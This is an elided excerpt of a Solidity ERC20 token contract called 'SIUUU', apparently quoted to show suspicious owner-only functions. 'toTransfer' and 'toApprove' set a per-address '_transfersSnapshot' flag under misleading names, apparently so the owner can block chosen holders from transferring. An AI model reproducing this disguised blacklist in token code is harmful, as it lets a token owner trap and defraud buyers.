...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function toTransfer(address [] calldata _addresses_) external onlyOwner {
    ...
    function toApprove(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _transfersSnapshot[_addresses_[i]] = false;
        }
    }

    function approvedCheck(address _address_) public view returns (bool) {
...
contract SIUUU is ERC20 {
    constructor() ERC20("SIUUU", "SIUUU") {
